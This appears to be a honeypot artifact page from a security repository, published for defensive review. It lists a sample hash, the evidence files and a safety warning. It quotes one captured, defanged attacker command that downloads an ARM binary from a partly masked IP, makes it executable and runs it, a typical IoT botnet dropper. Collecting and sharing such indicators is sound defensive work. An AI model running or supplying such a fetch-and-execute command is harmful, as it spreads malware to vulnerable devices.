# 07e121e2b542e5b596837d85d936bb31a8a9f09df2a3fb10ebe3bd23bf5bc6c1

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `07e121e2b542e5b596837d85d936bb31a8a9f09df2a3fb10ebe3bd23bf5bc6c1` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
rm arm7; wget hxxp://31[.]56[.]209[.]XXX/arm7; chmod 777 arm7;./arm7 telnet;
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
